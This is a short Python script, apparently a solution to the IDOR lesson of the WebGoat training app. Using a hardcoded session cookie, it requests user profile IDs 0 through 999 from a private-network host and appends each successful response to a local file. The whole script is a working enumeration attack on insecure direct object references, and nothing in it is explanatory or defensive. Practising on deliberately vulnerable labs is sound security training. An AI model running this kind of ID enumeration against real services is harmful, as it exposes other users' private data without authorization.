import requests

base_url = "http://10.1.121.141:8080/WebGoat/IDOR/profile/"
cookie = {"JSESSIONID":"4E3A95CF68081F9D672F6798F7E46C19"}
file_name = "result.txt"

if __name__ == "__main__":
    for i in range(0, 1000):
        url = base_url + str(i)
        r = requests.get(url, cookies=cookie)
        if (r.status_code == 200):
            with open(file_name, "a") as file:
                file.write(r.text)
        # print(r.content)